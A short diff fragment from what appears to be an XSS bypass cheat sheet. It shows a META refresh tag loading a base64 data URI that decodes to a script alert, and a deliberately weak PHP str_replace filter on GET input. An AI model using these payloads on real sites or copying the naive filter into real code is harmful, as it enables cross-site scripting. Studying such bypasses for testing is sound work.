@@ -10,5 +10,5 @@ filter ->nullbyte(%00)
 <META HTTP-EQUIV="refresh"CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
 PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K" = <script>alert('XSS')</script>
 ========================================
-replace :  echo 'Hello ' . str_replace('<script>', '', $_GET['name']);
+replace :  echo 'Hello ' . str_replace('<script>', '', $_GET['query']);
 
